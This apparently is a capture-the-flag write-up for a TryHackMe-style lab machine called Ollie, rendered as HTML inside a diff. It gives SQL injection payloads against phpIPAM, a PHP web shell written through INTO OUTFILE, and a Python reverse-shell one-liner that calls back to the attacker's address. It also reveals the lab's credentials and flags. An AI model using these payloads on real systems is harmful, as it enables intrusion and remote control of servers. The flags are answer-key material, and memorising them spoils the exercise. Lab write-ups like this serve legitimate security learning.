@@ -1,0 +1,86 @@
+I"Ё<blockquote>
+  <p>VOiD XD</p>
+</blockquote>
+
+<p>My IP : 10.8.253.221
+Target IP : 10.10.188.177</p>
+
+<h2 id="rustscan">Rustscan</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack
+80/tcp   open  http    syn-ack
+1337/tcp open  waste   syn-ack
+
+
+</code></pre></div></div>
+
+<h2 id="port-1337">PORT 1337</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 10.10.188.177 1337                                                         1 тип
+Hey stranger, I<span class="s1">'m Ollie, protector of panels, lover of deer antlers.
+
+What is your name? olie
+What'</span>s up, Olie! It<span class="s1">'s been a while. What are you here for? flag
+Ya'</span> know what? Olie. If you can answer a question about me, I might have something <span class="k">for </span>you.
+
+
+What breed of dog am I? I<span class="s1">'ll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Bulldog
+You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
+Please hold on a minute
+Ok, I'</span>m back.
+After a lengthy discussion, we<span class="s1">'ve come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.
+
+                    Username: admin
+
+                    Password: OllieUnixMontgomery!
+
+PS: Good luck and next time bring some treats!
+
+</span></code></pre></div></div>
+
+<h2 id="port-80">PORT 80</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.188.177/index.php?page<span class="o">=</span>login
+
+checking exploits gives
+https://fluidattacks.com/advisories/mercury/
+
+http://10.10.188.177/index.php?page<span class="o">=</span>administration&amp;section<span class="o">=</span>routing&amp;subnetId<span class="o">=</span>bgp&amp;sPage<span class="o">=</span>1
+
+<span class="s2">" union all select 1,2,3,group_concat(user,0x3a,file_priv) from mysql.user -- -
+
+ 1/3 (debian-sys-maint:Y,
+    mysql.infoschema:N,
+    mysql.session:N,
+    mysql.sys:N,
+    ollie_mysql:Y,
+    phpipam_ollie:Y,
+    root:Y)
+
+we have file permissions
+
+we have a simple web shell
+&lt;?php system(</span><span class="nv">$_GET</span><span class="s2">["</span>cmd<span class="s2">"]); ?&gt;
+
+"</span> Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE <span class="s1">'/var/www/html/shell.php'</span> <span class="nt">--</span> -
+
+http://10.10.188.177/shell.php?cmd<span class="o">=</span>which%20python3
+
+python3 <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.253.221",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</span>
+</code></pre></div></div>
+
+<h2 id="shell-www-data">Shell [www-data]</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su ollie
+OllieUnixMontgomery!
+
+ollie@hackerdog:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+THM<span class="o">{</span>Ollie_boi_is_daH_Cut3st<span class="o">}</span>
+
+pspy gives
+2022/04/21 16:13:00 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>37817  | <span class="o">(</span>feedme<span class="o">)</span> 
+
+ollie@hackerdog:/usr/bin<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> feedme 
+<span class="nt">-rwxrw-r--</span> 1 root ollie 30 Feb 12 02:31 feedme
+
+<span class="c"># cat root.txt</span>
+THM<span class="o">{</span>Ollie_Luvs_Chicken_Fries<span class="o">}</span>
+</code></pre></div></div>
+:ET
